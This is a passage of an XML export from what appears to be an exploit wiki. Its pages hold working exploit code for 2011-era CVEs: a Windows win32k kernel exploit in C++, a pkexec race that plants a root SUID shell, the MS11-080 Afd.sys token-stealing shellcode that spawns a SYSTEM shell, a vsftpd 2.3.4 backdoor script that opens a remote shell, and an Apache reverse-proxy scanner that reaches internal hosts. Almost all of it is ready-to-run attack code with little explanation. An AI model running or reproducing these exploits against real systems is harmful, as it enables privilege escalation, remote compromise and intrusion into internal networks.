    std::cout &lt;&lt; "Success to allocate : 0x" &lt;&lt; std::hex &lt;&lt; Addr &lt;&lt; std::endl;
    return Addr;
}

// allocate with NTAllocatVirtualMemory a place for putting a fake window
PVOID allocatefun()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 1024;
    ULONG Status = 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    while (Status)
    {
        std::cout &lt;&lt; "Error Allocate : 0x" &lt;&lt; std::hex &lt;&lt; Addr &lt;&lt; " "&lt;&lt; Status
            &lt;&lt; std::endl;
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    std::cout &lt;&lt; "Success to allocate : 0x" &lt;&lt; std::hex &lt;&lt; Addr &lt;&lt; std::endl;
    return Addr;
}


void prepdecr(HINSTANCE hInst)
{
    FakeWin = functionallocate();
    FakeWin = (char *)FakeWin + 0x64; // adding something for not having a double 0

    std::cout &lt;&lt; "Fake Win : " &lt;&lt; std::hex &lt;&lt; FakeWin &lt;&lt; std::endl;

    // we put this to 0 because of a check done in the function
    ((int *)FakeWin)[1] = 0;

    // we crate the string for the reallocation
    for (int i = 0; i &lt; 82; i++)
        str[i] = 'a';
    str[81] = '\0';
    // the address for the spwndNext : we put the address of our
    // FakeWindow
    str[0x2c / 2] = (char) (((int) FakeWin) &amp; 0xff);
    str[0x2c / 2 + 1] = (char) (((int) FakeWin &gt;&gt; 16) &amp; 0xff);
}

void changeaddrdecr(int addrdecr)
{
    // we put in the position for the next the addr to decr
    ((int *)FakeWin)[12] = (addrdecr - 4);
}

void decr(HINSTANCE hInst, int addrdecr)
{
    HHOOK hhk;

    // we first create two windows we will use for realloc with SetWindowText
    // this window are name win3 and win4
    win3 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);
    if (!win3)
    {
        std::cout &lt;&lt; "Window 3 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    win4 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win4)
    {
        std::cout &lt;&lt; "Window 4 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit(0);
    }
    // we need a third window which will set as the parent and then destroy
    // and reallocate using SetWindowText
    win2 = CreateWindowEx(WS_EX_LEFT, "Button", "Test title 2", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);
    if (!win2)
    {
        std::cout &lt;&lt; "Win2 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    std::cout &lt;&lt; "Window parrent : " &lt;&lt; win2 &lt;&lt; std::endl;
    std::cout &lt;&lt; "Window for the realloc : " &lt;&lt; win3 &lt;&lt; std::endl;
    std::cout &lt;&lt; "Window for the realloc : " &lt;&lt; win4 &lt;&lt; std::endl;

    // we set the hook where we will say that the win2 is the parrent
    hhk = SetWindowsHookEx(5, CBT_exploit, NULL, GetCurrentThreadId());

    // we create the window, all the exploit is during creation
    win = CreateWindowEx(WS_EX_LEFT, "MyWinClass", "Test title", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    // we check that everything as been going fine
    if (!win)
    {
        std::cout &lt;&lt; "An error occur during the creation and the exploit : "
            &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    // we unset the hook for the next creation
    UnhookWindowsHookEx(hhk);

    // we put the addr to decrement to 0 because if we relink
    // the value we went to decrement could change
    changeaddrdecr(0);
}

void callnull(HINSTANCE hInst, int addrdecr)
{
    HHOOK hhk;
    HWND tmp1;
    HWND tmp2;

    // here we will need two fake windows, the second is the one we will
    // be decrement and will be use to call null
    FakeWin = functionallocate();
    FakeWin2 = allocatefun();
    FakeWin = (char *)FakeWin + 0x64; // adding something for not having a double 0

    std::cout &lt;&lt; "Fake Win : " &lt;&lt; std::hex &lt;&lt; FakeWin &lt;&lt; std::endl;
    std::cout &lt;&lt; "Fake Win 2 : " &lt;&lt; std::hex &lt;&lt; FakeWin2 &lt;&lt; std::endl;

    ((int *)FakeWin)[1] = 0;

    // we put the addr to decrement as our second false window
    ((int *)FakeWin)[12] = (int)FakeWin2;

    // we set the handler for our fake window as the one we have modify
    ((int *) FakeWin2)[0] =  (int) destroy;
    // we set the clock obj to 1, as it will be set to 0 it will call the
    // destroying function for the type associate and so call the null page
    ((int *) FakeWin2)[1] =  1;

    // we create the string for the reallocation
    for (int i = 0; i &lt; 82; i++)
        str[i] = 'a';
    str[81] = '\0';
    // the address for the spwndNext
    str[0x2c / 2] = (char) (((int) FakeWin) &amp; 0xff);
    str[0x2c / 2 + 1] = (char) (((int) FakeWin &gt;&gt; 16) &amp; 0xff);

    tmp1 = win3;
    // like previously we creatte two window for reallocate
    win3 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win3)
    {
        std::cout &lt;&lt; "Win3 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    tmp2 = win4;
    win4 = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);

    if (!win4)
    {
        std::cout &lt;&lt; "Win4 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    // and one wich will be the parrent and then destroy
    win2 = CreateWindowEx(WS_EX_LEFT, "Button", "Test title 2", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    if (!win2)
    {
        // Funny thing if I exit here the destruction of the window potentially
        // call the null page
        std::cout &lt;&lt; "Win2 not created : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit(0);
    }

    std::cout &lt;&lt; "Window 2 : " &lt;&lt; win2 &lt;&lt; std::endl;
    std::cout &lt;&lt; "Window 3 : " &lt;&lt; win3 &lt;&lt; std::endl;
    std::cout &lt;&lt; "Window 4 : " &lt;&lt; win4 &lt;&lt; std::endl;

    // and finnaly we do the exploit
    hhk = SetWindowsHookEx(5, CBT_exploit, NULL, GetCurrentThreadId());


    win = CreateWindowEx(WS_EX_LEFT, "MyWinClass", "Test title", WS_TILEDWINDOW, 0, 0, 200, 200,
        NULL, NULL, hInst, NULL);

    if (!win)
    {
        std::cout &lt;&lt; "Error during the call to the null page : " &lt;&lt; GetLastError() &lt;&lt; std::endl;
        exit (0);
    }

    UnhookWindowsHookEx(hhk);

}


void cve ()
{
    int addrdecr;

    HINSTANCE hInst;
    PVOID FakeWin;

    hInst = init();

    // the window to destroy
    destroy = CreateWindowEx(WS_EX_LEFT, "Button", NULL, WS_TILEDWINDOW, 500, 500, 100, 100,
        NULL, NULL, hInst, NULL);
    std::cout &lt;&lt; "Destroy Window : " &lt;&lt; destroy &lt;&lt; std::endl;
    std::cout &lt;&lt; "Offset table : " &lt;&lt; get_table_offset_from_handle((int) destroy) &lt;&lt; std::endl;
    addrdecr = BEGIN_HTABLE + get_table_offset_from_handle((int) destroy) + 9;

    prepdecr(hInst);

    std::cout &lt;&lt; "Begin the three decrement for the flag" &lt;&lt; std::endl;

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);
    // we set the addr each time
    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    std::cout &lt;&lt; "Begin the decrement of the type" &lt;&lt; std::endl;

    // we change the decrement for setting the type of the window
    addrdecr--;
    // not sure if it's really useful
    prepdecr(hInst);

    changeaddrdecr(addrdecr);
    decr(hInst, addrdecr);

    std::cout &lt;&lt; "Last decrementation done" &lt;&lt; std::endl;

    // here the window to decr as the good value we need just now to delete it
    // via the call to link window
    std::cout &lt;&lt; "Before : Triger the deletion of the free type" &lt;&lt; std::endl;

    callnull(hInst, addrdecr);

    std::cout &lt;&lt; "End" &lt;&lt; std::endl;
}

int main()
{
    cve();
}

&lt;/pre&gt;</text>
      <sha1>8eqn45yt42r4lxfa4mzh85uv0aohww1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-1475 Apache Tomcat 7.0.x漏洞</title>
    <ns>0</ns>
    <id>715</id>
    <revision>
      <id>955</id>
      <timestamp>2021-04-03T06:25:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-1475.zip"</comment>
      <origin>955</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="2teyb8n5gd0mwihlwtpl8sm6h381b6p" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-1475.zip</text>
      <sha1>2teyb8n5gd0mwihlwtpl8sm6h381b6p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-1485 pkexec特權提升漏洞</title>
    <ns>0</ns>
    <id>716</id>
    <revision>
      <id>956</id>
      <timestamp>2021-04-03T06:27:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==run.sh== &lt;pre&gt; # modified from http://downloads.securityfocus.com/vulnerabilities/exploits/47496.sh # for rdot.org cat &gt; suid.c &lt;&lt; _EOF #include &lt;stdio.h&gt; #include &lt;stdlib.h..."</comment>
      <origin>956</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1072" sha1="l10n0hztbzwl4pvhz5uivjk5k7nz1q2" xml:space="preserve">==run.sh==
&lt;pre&gt;
# modified from http://downloads.securityfocus.com/vulnerabilities/exploits/47496.sh
# for rdot.org
cat &gt; suid.c &lt;&lt; _EOF
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
main(int argc, char *argv[])
{
if(argc == 2) {
setgid(0); setuid(0);
system(argv[1]); }
return 0;
}
_EOF
cat &gt; makesuid.c &lt;&lt; _EOF
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/inotify.h&gt;
int main(int argc, char **argv)
{
   if (fork() != 0)
	{	    
		int fd;
		char pid_path[15];
		sprintf(pid_path, "/proc/%i", getpid());
		close(0); close(1); close(2);
		fd = inotify_init();
		inotify_add_watch(fd, pid_path, IN_ACCESS);
		read(fd, NULL, 0);
		execl("/usr/bin/passwd", "/usr/bin/passwd", NULL);	
	}   
	else
	{
		    execl("/usr/bin/pkexec", "pkexec", argv[1],argv[2],argv[3], NULL);
	}

    return 0;
}

_EOF
gcc -o suid suid.c
gcc -o makesuid makesuid.c
./makesuid chown root:root $PWD/suid
./makesuid chmod u+s $PWD/suid
echo "your suid is on ./suid make sure u move this !!!"
rm suid.c makesuid.c makesuid
$PWD/suid -c /usr/bin/id

&lt;/pre&gt;</text>
      <sha1>l10n0hztbzwl4pvhz5uivjk5k7nz1q2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-1571 Apache Tomcat任意命令執行漏洞</title>
    <ns>0</ns>
    <id>717</id>
    <revision>
      <id>957</id>
      <timestamp>2021-04-03T06:29:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-1571.zip"</comment>
      <origin>957</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="8ijnp3d0jvjdaklijbyl9u66nzvsqyu" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2011-1571.zip</text>
      <sha1>8ijnp3d0jvjdaklijbyl9u66nzvsqyu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-1575 Pure-FTPd中間人攻擊漏洞</title>
    <ns>0</ns>
    <id>718</id>
    <revision>
      <id>958</id>
      <timestamp>2021-04-03T06:30:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/bin/bash echo -e "AUTH TLS\r\nFEAT\r\n" | ncat -C -v $1 21  &lt;/pre&gt;"</comment>
      <origin>958</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="83" sha1="62bpvhif2y7nd721arbufvnrq865nan" xml:space="preserve">==POC==
&lt;pre&gt;
#!/bin/bash
echo -e "AUTH TLS\r\nFEAT\r\n" | ncat -C -v $1 21

&lt;/pre&gt;</text>
      <sha1>62bpvhif2y7nd721arbufvnrq865nan</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-2005 MS11-080 Afd.sys權限提升漏洞</title>
    <ns>0</ns>
    <id>510</id>
    <revision>
      <id>713</id>
      <timestamp>2021-03-27T03:23:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ################################################################################ ######### MS11-080 - CVE-2011-2005 Afd.sys Privilege Escalation Exploit ########..."</comment>
      <origin>713</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11951" sha1="4vw88une2i4yvkhvy6pj6xgs80087v6" xml:space="preserve">==EXP==
&lt;pre&gt;
################################################################################
######### MS11-080 - CVE-2011-2005 Afd.sys Privilege Escalation Exploit ########
#########         Author: ryujin@offsec.com - Matteo Memelli            ########
#########                      Spaghetti &amp; Pwnsauce                     ########
#########              yuck! 0xbaadf00d Elwood@mac&amp;cheese.com           ########
#########                                                               ########
#########      Thx to dookie(lifesaver)2000ca, dijital1 and ronin       ########
#########                        for helping out!                       ########
#########                                                               ########
#########                   To my Master Shifu muts:                    ########
#########           "So that's it, I just need inner peace?" ;)         ########
#########                                                               ########
#########        Exploit tested on the following 32bits systems:        ########
#########       Win XPSP3 Eng, Win 2K3SP2 Standard/Enterprise Eng       ########
################################################################################

from ctypes import (windll, CDLL, Structure, byref, sizeof, POINTER,
                    c_char, c_short, c_ushort, c_int, c_uint, c_ulong,
                    c_void_p, c_long, c_char_p)
from ctypes.wintypes import HANDLE, DWORD
import socket, time, os, struct, sys
from optparse import OptionParser

usage =  "%prog -O TARGET_OS"
parser = OptionParser(usage=usage)
parser.add_option("-O", "--target-os", type="string",
                  action="store", dest="target_os",
                  help="Target OS. Accepted values: XP, 2K3")
(options, args) = parser.parse_args()
OS = options.target_os
if not OS or OS.upper() not in ['XP','2K3']:
   parser.print_help()
   sys.exit()
OS = OS.upper()

kernel32 = windll.kernel32
ntdll    = windll.ntdll
Psapi    = windll.Psapi

def findSysBase(drvname=None):
    ARRAY_SIZE            = 1024
    myarray               = c_ulong * ARRAY_SIZE 
    lpImageBase           = myarray() 
    cb                    = c_int(1024) 
    lpcbNeeded            = c_long() 
    drivername_size       = c_long() 
    drivername_size.value = 48
    Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded)) 
    for baseaddy in lpImageBase: 
        drivername = c_char_p("\x00"*drivername_size.value) 
        if baseaddy: 
            Psapi.GetDeviceDriverBaseNameA(baseaddy, drivername, 
                            drivername_size.value)
            if drvname:
                if drivername.value.lower() == drvname:
                    print "[+] Retrieving %s info..." % drvname
                    print "[+] %s base address: %s" % (drvname, hex(baseaddy))
                    return baseaddy
            else:
                if drivername.value.lower().find("krnl") !=-1:
                    print "[+] Retrieving Kernel info..."
                    print "[+] Kernel version:", drivername.value
                    print "[+] Kernel base address: %s" % hex(baseaddy) 
                    return (baseaddy, drivername.value)
    return None

print "[&gt;] MS11-080 Privilege Escalation Exploit"
print "[&gt;] Matteo Memelli - ryujin@offsec.com"
print "[&gt;] Release Date 28/11/2011"

WSAGetLastError          = windll.Ws2_32.WSAGetLastError
WSAGetLastError.argtypes = ()
WSAGetLastError.restype  = c_int
SOCKET                   = c_int
WSASocket                = windll.Ws2_32.WSASocketA
WSASocket.argtypes       = (c_int, c_int, c_int, c_void_p, c_uint, DWORD)
WSASocket.restype        = SOCKET
closesocket              = windll.Ws2_32.closesocket
closesocket.argtypes     = (SOCKET,)
closesocket.restype      = c_int
connect                  = windll.Ws2_32.connect
connect.argtypes         = (SOCKET, c_void_p, c_int)
connect.restype          = c_int

class sockaddr_in(Structure):
    _fields_ = [
        ("sin_family", c_short),
        ("sin_port", c_ushort),
        ("sin_addr", c_ulong),
        ("sin_zero", c_char * 8),
        ]

## Create our deviceiocontrol socket handle
client = WSASocket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP,
                   None, 0, 0)
if client == ~0:
    raise OSError, "WSASocket: %s" % (WSAGetLastError(),)
try:
    addr = sockaddr_in()
    addr.sin_family = socket.AF_INET
    addr.sin_port = socket.htons(4455)
    addr.sin_addr = socket.htonl(0x7f000001) # 127.0.0.1
    ## We need to connect to a closed port, socket state must be CONNECTING
    connect(client, byref(addr), sizeof(addr))
except:
    closesocket(client)
    raise

baseadd    = c_int(0x1001)
MEMRES     = (0x1000 | 0x2000)
PAGEEXE    = 0x00000040
Zerobits   = c_int(0)
RegionSize = c_int(0x1000)
written    = c_int(0)
## This will trigger the path to AfdRestartJoin
irpstuff   = ("\x41\x41\x41\x41\x42\x42\x42\x42"
              "\x00\x00\x00\x00\x44\x44\x44\x44"
              "\x01\x00\x00\x00"
              "\xe8\x00" + "4" + "\xf0\x00" + "\x45"*231)
## Allocate space for the input buffer
dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                     byref(baseadd),
                                     0x0,
                                     byref(RegionSize),
                                     MEMRES,
                                     PAGEEXE)
# Copy input buffer to it
kernel32.WriteProcessMemory(-1, 0x1000, irpstuff, 0x100, byref(written))
startPage = c_int(0x00020000)
kernel32.VirtualProtect(startPage, 0x1000, PAGEEXE, byref(written))
################################# KERNEL INFO ##################################
lpDriver     = c_char_p()
lpPath       = c_char_p()
lpDrvAddress = c_long()
(krnlbase, kernelver) = findSysBase()
hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
HalDispatchTable -= hKernel
HalDispatchTable += krnlbase
print "[+] HalDispatchTable address:", hex(HalDispatchTable)
halbase = findSysBase("hal.dll")
## WinXP SP3
if OS == "XP":
    HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
    HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
## Win2k3 SP2
else:
    HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
    HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
print "[+] HaliQuerySystemInformation address:", hex(HaliQuerySystemInformation)
print "[+] HalpSetSystemInformation address:", hex(HalpSetSystemInformation)

################################# EXPLOITATION #################################
shellcode_address_dep   = 0x0002071e
shellcode_address_nodep = 0x000207b8
padding           = "\x90"*2
HalDispatchTable0x4 = HalDispatchTable + 0x4
HalDispatchTable0x8 = HalDispatchTable + 0x8
## tokenbkaddr      = 0x00020900
if OS == "XP":
    _KPROCESS = "\x44"
    _TOKEN    = "\xc8"
    _UPID     = "\x84"
    _APLINKS  = "\x88"
else:
    _KPROCESS = "\x38"
    _TOKEN    = "\xd8"
    _UPID     = "\x94"
    _APLINKS  = "\x98"
   
restore_ptrs =   "\x31\xc0" + \
                 "\xb8" + struct.pack("L", HalpSetSystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x8) + \
                 "\xb8" + struct.pack("L", HaliQuerySystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x4)
tokenstealing =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x89\x1d\x00\x09\x02\x00"             +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5b"                                 +\
                 "\x5a"                                 +\
                 "\xc2\x10"
restore_token =  "\x52"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\x15\x00\x09\x02\x00"             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5a"                                 +\
                 "\xc2\x10"
                
shellcode         = padding + restore_ptrs + tokenstealing
shellcode_size    = len(shellcode)
orig_size         = shellcode_size
# Write shellcode in userspace (dep)
kernel32.WriteProcessMemory(-1, shellcode_address_dep, shellcode,
                                   shellcode_size, byref(written))
# Write shellcode in userspace *(nodep)
kernel32.WriteProcessMemory(-1, shellcode_address_nodep, shellcode,
                                   shellcode_size, byref(written))
## Trigger Pointer Overwrite
print "[*] Triggering AFDJoinLeaf pointer overwrite..."
IOCTL             = 0x000120bb                # AFDJoinLeaf
inputbuffer       = 0x1004
inputbuffer_size  = 0x108
outputbuffer_size = 0x0                       # Bypass Probe for Write
outputbuffer      = HalDispatchTable0x4 + 0x1 # HalDispatchTable+0x4+1
IoStatusBlock = c_ulong()
NTSTATUS = ntdll.ZwDeviceIoControlFile(client,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       IOCTL,
                                       inputbuffer,
                                       inputbuffer_size,
                                       outputbuffer,
                                       outputbuffer_size
                                       )
## Trigger shellcode
inp  = c_ulong()
out  = c_ulong()
inp  = 0x1337
hola = ntdll.NtQueryIntervalProfile(inp, byref(out))
## Spawn a system shell, w00t!
print "[*] Spawning a SYSTEM shell..."
os.system("cmd.exe /T:C0 /K cd c:\\windows\\system32")

############################## POST EXPLOITATION ###############################
print "[*] Restoring token..."
## Restore the thingie
shellcode         = padding + restore_ptrs + restore_token
shellcode_size    = len(shellcode)
trail_padding     = (orig_size - shellcode_size) * "\x00"
shellcode        += trail_padding
shellcode_size   += (orig_size - shellcode_size)
## Write restore shellcode in userspace (dep)
kernel32.WriteProcessMemory(-1, shellcode_address_dep, shellcode,
                                   shellcode_size, byref(written))
## Write restore shellcode in userspace (nodep)
kernel32.WriteProcessMemory(-1, shellcode_address_nodep, shellcode,
                                   shellcode_size, byref(written))
## Overwrite HalDispatchTable once again
NTSTATUS = ntdll.ZwDeviceIoControlFile(client,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       IOCTL,
                                       inputbuffer,
                                       inputbuffer_size,
                                       outputbuffer,
                                       outputbuffer_size
                                       )
## Trigger restore shellcode
hola = ntdll.NtQueryIntervalProfile(inp, byref(out))
print "[+] Restore done! Have a nice day :)"
&lt;/pre&gt;</text>
      <sha1>4vw88une2i4yvkhvy6pj6xgs80087v6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-2523 vsftpd 2.3.4 後門命令執行漏洞</title>
    <ns>0</ns>
    <id>1254</id>
    <revision>
      <id>1571</id>
      <timestamp>2021-04-13T02:09:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution # Date: 9-04-2021 # Exploit Author: HerculesRD # Software Link: http://www.linuxfromscratch.org/~thoma..."</comment>
      <origin>1571</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1251" sha1="9e11moe4x288hki71mhx1f8uuvnmzcb" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
&lt;/pre&gt;</text>
      <sha1>9e11moe4x288hki71mhx1f8uuvnmzcb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-3368 Apache HTTP Server漏洞</title>
    <ns>0</ns>
    <id>719</id>
    <revision>
      <id>959</id>
      <timestamp>2021-04-03T06:32:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/env python  import socket import string import getopt, sys   known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]  def..."</comment>
      <origin>959</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3982" sha1="hdg1rkucipjiug2kprrfs4gtmedehxn" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/env python

import socket
import string
import getopt, sys


known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]

def send_request(url, apache_target, apache_port, internal_target, internal_port, resource):

  get = "GET " + url + "@" + internal_target + ":" + internal_port +  "/" + resource + " HTTP/1.1\r\n"
  get = get + "Host: " + apache_target + "\r\n\r\n"
  
  remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  remoteserver.settimeout(3)

  try:
    remoteserver.connect((apache_target, int(apache_port)))
    remoteserver.send(get)
    return remoteserver.recv(4096)
  except:
    return ""

def get_banner(result):
  return result[string.find(result, "\r\n\r\n")+4:]


def scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):

  print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)
  for port in tested_ports:
    port = str(port)
    result = send_request(url, apache_target, apache_port, internal_target, port, resource)
    if string.find(result,"HTTP/1.1 200")!=-1 or \
    string.find(result,"HTTP/1.1 30")!=-1 or \
    string.find(result,"HTTP/1.1 502")!=-1:
      print "- Open port: " + port + "/TCP"
      print get_banner(result)
    elif len(result)==0:
       print "- Filtered port: " + port + "/TCP"
    else:
       print "- Closed port: " + port + "/TCP"
      

def usage():
  print
  print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
  print "http://www.secforce.co.uk"
  print
  print "usage():"
  print "python apache_scan.py [options]"
  print
  print " [options]"
  print "    -r: Remote Apache host"
  print "    -p: Remote Apache port (default is 80)"
  print "    -u: URL on the remote web server (default is /)"
  print "    -d: Host in the DMZ (default is 127.0.0.1)"
  print "    -e: Port in the DMZ (enables 'single port scan')"
  print "    -g: GET request to the host in the DMZ (default is /)"
  print "    -h: Help page"
  print
  print "examples:"
  print " - Port scan of the remote host"
  print "    python apache_scan.py -r www.example.com -u /images/test.gif"
  print " - Port scan of a host in the DMZ"
  print "    python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local"
  print " - Retrieve a resource from a host in the DMZ"
  print "    python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html"
  print

def print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):
  print
  print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
  print "http://www.secforce.com"
  print
  print " [+] Target: " + apache_target
  print " [+] Target port: " + apache_port
  print " [+] Internal host: " + internal_target
  print " [+] Tested ports: " + str(tested_ports)
  print " [+] Internal resource: " + resource
  print


def main():

  global apache_target
  global apache_port
  global url
  global internal_target
  global internal_port
  global resource

  try:
    opts, args = getopt.getopt(sys.argv[1:], "u:r:p:d:e:g:h", ["help"])
  except getopt.GetoptError:
    usage()
    sys.exit(2)

  try:
    for o, a in opts:
      if o in ("-h", "--help"):
        usage()
        sys.exit(2)
      if o == "-u":
        url=a
      if o == "-r":
        apache_target=a
      if o == "-p":
        apache_port=a
      if o == "-d":
        internal_target = a
      if o == "-e":
        internal_port=a
      if o == "-g":
        resource=a        
    
  except getopt.GetoptError:
    usage()
    sys.exit(2)
    
  if apache_target == "":
    usage()
    sys.exit(2)


url = "/"
apache_target = ""
apache_port = "80"
internal_target = "127.0.0.1"
internal_port = ""
resource = "/"

main()

if internal_port!="":
  tested_ports = [internal_port]
else:
  tested_ports = known_ports

scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)
&lt;/pre&gt;</text>
      <sha1>hdg1rkucipjiug2kprrfs4gtmedehxn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-3556 Oracle Java SE JDK漏洞</title>
    <ns>0</ns>
    <id>720</id>
    <revision>
      <id>960</id>
      <timestamp>2021-04-03T06:34:18Z</timestamp>
